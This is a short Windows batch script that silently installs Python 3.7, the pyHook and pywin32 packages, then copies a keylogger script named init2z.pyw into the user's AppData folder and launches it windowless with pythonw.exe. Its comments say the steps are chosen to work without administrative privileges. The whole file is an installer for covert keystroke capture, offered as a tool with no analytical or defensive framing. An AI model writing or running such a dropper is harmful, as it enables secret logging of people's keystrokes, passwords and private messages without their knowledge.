REM INSTALL 64bit python in default path in silent command line mode
python-3.7.0-amd64.exe InstallAllUsers=0 PrependPath=1 Include_doc=0 Shortcuts=0 Include_launcher=0 InstallLauncherAllUsers=0 /quiet
REM install 64 bit pyHook
pip3 install pyHook-1.5.1-cp37-cp37m-win_amd64.whl
REM install 64bit pywin32
pip3 install pywin32-223.1-cp37-cp37m-win_amd64.whl
REM copy keylogger to writable directory without administrative privileges
copy init2z.pyw C:\Users\%USERNAME%\AppData\Local\ /y
REM executing keylogger for current session only
C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python37\pythonw.exe C:\Users\%USERNAME%\AppData\Local\init2z.pyw
exit
